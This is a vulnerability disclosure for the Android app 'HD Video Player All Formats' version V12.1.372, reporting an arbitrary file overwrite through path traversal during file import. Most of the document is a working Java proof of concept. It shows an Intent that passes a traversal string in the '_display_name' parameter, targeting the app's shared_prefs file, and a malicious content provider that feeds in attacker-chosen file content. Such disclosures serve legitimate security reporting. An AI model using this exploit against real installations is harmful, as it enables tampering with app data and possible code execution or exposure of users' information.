## HD Video Player All Formats APP Arbitrary File Overwrite Vulnerability

Vendor：RAREPROB SOLUTIONS PRIVATE LIMITED (https://rareprob-website.firebaseapp.com/)

Affected product：HD Video Player All Formats (com.rocks.music.videoplayer)

Version：V12.1.372

Google Play link：https://play.google.com/store/apps/details?id=com.rocks.music.videoplayer

Vulnerability Description：The HD Video Player All Formats app lacks proper security checks during the file import process, allowing unauthorized apps to control the file name and content and use path traversal to overwrite arbitrary files in the app’s internal storage, which may lead to arbitrary code execution, exposure of sensitive information, denial of service, and other security impacts.



poc：

```java
//Attack Intent
//For example, to overwrite the file /data/data/com.rocks.music.videoplayer/shared_prefs/FBAdPrefs.xml.
Intent it=new Intent(Intent.ACTION_VIEW);
it.setComponent(new ComponentName("com.rocks.music.videoplayer","com.rocks.music.videoplayer.DeeplinkActivity"));
it.setDataAndType(Uri.parse("content://media.evil.contentprovider/" +
                     "?_display_name=../../../../../../../../../../../../../data/data/com.rocks.music.videoplayer/shared_prefs/FBAdPrefs.xml"),"video/*");
startActivity(it);

//Evil Provider
//Authority:media.evil.contentprovider
public ParcelFileDescriptor openFile(@NonNull Uri uri, @NonNull String mode) throws FileNotFoundException {
        File file;
        file = new File(getContext().getCacheDir(), "ggg");

        try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(("<b>Attack@Lu1u</b>").getBytes());
            fos.flush();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
}
public Cursor query(@NonNull Uri uri, @Nullable String[] strings, @Nullable String s, @Nullable String[] strings1, @Nullable String s1) {
        String displayName=uri.getQueryParameter("_display_name");
        MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name","_size"});
        matrixCursor.addRow(new Object[]{displayName,1000});
        return  matrixCursor;
    }
```



https://github.com/user-attachments/assets/10b63f9b-ccef-4363-8ed0-d81b0f55c148

